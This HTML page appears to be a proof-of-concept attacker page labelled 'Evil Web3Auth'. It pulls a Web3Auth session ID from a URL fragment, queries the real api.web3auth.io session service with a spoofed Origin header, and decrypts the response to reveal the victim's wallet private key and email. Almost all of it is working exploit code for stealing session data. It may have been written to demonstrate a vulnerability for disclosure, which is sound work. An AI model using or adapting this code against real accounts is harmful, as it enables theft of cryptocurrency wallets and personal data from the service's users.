<!DOCTYPE html>
<html>
<head>
    <title>⚠️ Evil Web3Auth</title>
    <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; margin: 5px; }
        pre { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; overflow: auto; }
        #log { height: 300px; overflow: auto; background: #f5f5f5; padding: 10px; }
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>👿 Evil Web3Auth (Attacker)</h1>
    
    <button id="extractSession">1. Extract Session from URL</button>
    <button id="retrieveData">2. Retrieve Encrypted Data</button>
    <button id="decryptData">3. Decrypt and Steal Keys</button>
    
    <h3>Stolen Data:</h3>
    <pre id="output">Waiting for actions...</pre>
    
    <h3>Log:</h3>
    <div id="log"></div>

    <script src="https://cdn.jsdelivr.net/npm/@toruslabs/eccrypto@7.0.0/dist/eccrypto.umd.min.js"></script>
    <script>
        let stolenSessionId = null;
        let encryptedData = null;
        
        function log(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            entry.style.color = type === 'error' ? 'red' : (type === 'success' ? 'green' : 'black');
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // Step 1: Extract sessionId from URL
        document.getElementById('extractSession').onclick = () => {
            const hash = window.location.hash.substring(1);
            const params = new URLSearchParams(hash);
            const b64 = params.get('b64Params');
            
            if (!b64) {
                log('❌ No b64Params in URL', 'error');
                document.getElementById('output').textContent = 'No session ID found. Login first.';
                return;
            }
            
            try {
                const decoded = JSON.parse(atob(b64));
                stolenSessionId = decoded.sessionId;
                document.getElementById('output').textContent = 
                    `✅ Session ID stolen: ${stolenSessionId}`;
                log('✅ Session ID extracted from URL', 'success');
            } catch (e) {
                log('❌ Failed to decode: ' + e.message, 'error');
            }
        };

        // Step 2: Retrieve encrypted data from session server
        document.getElementById('retrieveData').onclick = async () => {
            if (!stolenSessionId) {
                log('❌ Extract session ID first', 'error');
                return;
            }

            try {
                // Convert sessionId to public key
                const sessionKey = eccrypto.toBuffer(stolenSessionId);
                const pubKey = eccrypto.getPublic(sessionKey);
                const pubKeyHex = pubKey.toString('hex');

                log(`🔑 Derived public key: ${pubKeyHex.substring(0, 40)}...`);

                // Call session server from THIS origin (evilweb3auth.vercel.app)
                const response = await fetch('https://api.web3auth.io/session-service/v2/store/get', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Origin': 'https://evilweb3auth.vercel.app'
                    },
                    body: JSON.stringify({ 
                        key: pubKeyHex, 
                        namespace: '' 
                    })
                });

                const data = await response.json();
                
                if (data.message && data.message.length > 10) {
                    encryptedData = data.message;
                    document.getElementById('output').textContent = 
                        '✅ Encrypted data retrieved:\n' + 
                        JSON.stringify(JSON.parse(encryptedData), null, 2);
                    log('✅ Session data retrieved from server!', 'success');
                } else {
                    document.getElementById('output').textContent = 
                        '❌ No data returned (blocked)';
                    log('❌ Server returned empty data', 'error');
                }
            } catch (error) {
                log('❌ Retrieval error: ' + error.message, 'error');
            }
        };

        // Step 3: Decrypt and steal keys
        document.getElementById('decryptData').onclick = async () => {
            if (!stolenSessionId || !encryptedData) {
                log('❌ Need session ID and encrypted data first', 'error');
                return;
            }

            try {
                const enc = JSON.parse(encryptedData);
                const sessionKey = eccrypto.toBuffer(stolenSessionId);
                
                const decrypted = await eccrypto.decrypt(sessionKey, {
                    ciphertext: eccrypto.toBuffer(enc.ciphertext),
                    ephemPublicKey: eccrypto.toBuffer(enc.ephemPublicKey),
                    iv: eccrypto.toBuffer(enc.iv),
                    mac: eccrypto.toBuffer(enc.mac)
                });

                const stolenData = JSON.parse(decrypted.toString());
                
                document.getElementById('output').textContent = 
                    '🔥 STOLEN WALLET KEYS 🔥\n\n' +
                    JSON.stringify(stolenData, null, 2);
                
                log('🚨 PRIVATE KEY STOLEN!', 'success');
                
                // Try to exfiltrate (for demo purposes - shows what attacker would do)
                if (stolenData.walletKey) {
                    log(`💰 Wallet Key: ${stolenData.walletKey}`, 'success');
                }
                if (stolenData.email) {
                    log(`📧 Victim Email: ${stolenData.email}`, 'success');
                }
                
            } catch (error) {
                log('❌ Decryption failed: ' + error.message, 'error');
            }
        };

        // Auto-extract on page load
        window.onload = () => {
            const hash = window.location.hash;
            if (hash && hash.includes('b64Params')) {
                log('🔍 URL contains session ID parameters - ready to extract', 'info');
            }
        };
    </script>
</body>
</html>
